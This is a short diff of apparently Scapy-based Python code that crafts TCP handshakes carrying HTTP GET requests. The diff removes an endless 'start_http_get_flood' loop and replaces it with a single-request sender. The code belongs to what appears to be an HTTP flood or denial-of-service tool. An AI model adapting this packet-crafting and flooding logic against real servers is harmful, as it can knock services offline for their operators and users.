@@ -40,10 +40,6 @@ def make_tcp_handshake(destination_ip, request_line):
     #ack packet
     return IP(dst=destination_ip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1) / request_line 
 
-def start_http_get_flood(destination_ip):
-    """Continuously send HTTP GET requests"""
-    try:
-        while True:
-            send(make_tcp_handshake(destination_ip, choice(request_lines)), inter=packet_builder.generate_delay())
-    except KeyboardInterrupt:
-        print("...Exiting...")
+def send_get_packet(destination_ip):
+    """Send HTTP GET request"""
+    send(make_tcp_handshake(destination_ip, choice(request_lines)), inter=packet_builder.generate_delay())
